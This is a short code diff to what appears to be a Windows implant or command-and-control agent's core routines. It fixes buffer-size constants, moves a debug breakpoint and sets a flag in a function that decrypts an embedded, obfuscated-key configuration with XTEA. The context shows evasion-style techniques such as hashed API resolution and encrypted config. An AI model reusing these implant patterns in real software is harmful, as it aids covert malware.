@@ -52,8 +52,8 @@ namespace Core {
         ULONG Kernel32              = { };
         OSVERSIONINFOW OSVersionW   = { };
 
-        CreateParser(&Parser, Strings, 256);
-        x_memset(Strings, 0, 256);
+        CreateParser(&Parser, Strings, sizeof(Strings));
+        x_memset(Strings, 0, sizeof(Strings));
 
         if (!(FPTR2(Ctx->Nt.RtlGetVersion, NTDLL, RTLGETVERSION))) {
             return_defer(ERROR_PROC_NOT_FOUND);
@@ -252,14 +252,15 @@ namespace Core {
 
     VOID ReadConfig() {
         HEXANE
+        Ctx->LE = TRUE;
 
         PARSER Parser       = { };
         BYTE InitKey[16]    = { OBF_KEY };
 
-        __debugbreak();
         CreateParser(&Parser, Config, sizeof(Config));
-        x_memset(Config, 0, 512);
+        x_memset(Config, 0, sizeof(Config));
 
+        __debugbreak();
         XteaCrypt(B_PTR(Parser.Handle), Parser.Length, InitKey, FALSE);
 
         ParserMemcpy(&Parser, &Ctx->Config.Key);
